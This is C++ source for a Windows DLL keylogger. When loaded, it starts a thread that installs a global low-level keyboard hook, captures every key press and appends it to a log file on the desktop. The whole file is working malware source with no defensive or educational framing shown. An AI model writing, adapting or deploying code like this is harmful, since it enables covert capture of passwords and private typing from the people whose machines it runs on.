#include <windows.h>
#include <fstream>
#include <thread>
#include <mutex>

HHOOK hKeyboardHook;
std::mutex logMutex;
std::ofstream logFile;

// Logs a key to a file
void LogKey(int key) {
    std::lock_guard<std::mutex> lock(logMutex);

    if (logFile.is_open()) {
        if ((key >= 0x30 && key <= 0x5A) || key == VK_SPACE) {
            logFile << static_cast<char>(key);
        } else {
            logFile << "[" << key << "]";
        }
        logFile.flush();
    }
}

// Low-level keyboard procedure
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* pKeyboard = (KBDLLHOOKSTRUCT*)lParam;
        LogKey(pKeyboard->vkCode);
    }
    return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
}

// Hook thread that installs and maintains the keyboard hook
DWORD WINAPI HookThread(LPVOID) {
    HINSTANCE hInstance = GetModuleHandle(nullptr);
    // hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, hInstance, 0);
    hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, nullptr, 0);
    if (!hKeyboardHook) {
        MessageBox(NULL, "Hook failed", "Error", MB_ICONERROR);
        return 1;
    }

    // Message loop to keep hook alive
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) { 
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hKeyboardHook);
    return 0;
}

// DllMain sets up the hook in a separate thread
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        logFile.open("C:\\Users\\X\\Desktop\\keylog.txt", std::ios::app);
        DisableThreadLibraryCalls(hModule);  // Avoid unnecessary thread attach/detach
        CreateThread(NULL, 0, HookThread, NULL, 0, NULL);
        break;
    case DLL_PROCESS_DETACH:
        if (logFile.is_open()) {
            logFile.close();
        }
        break;
    }
    return TRUE;
}
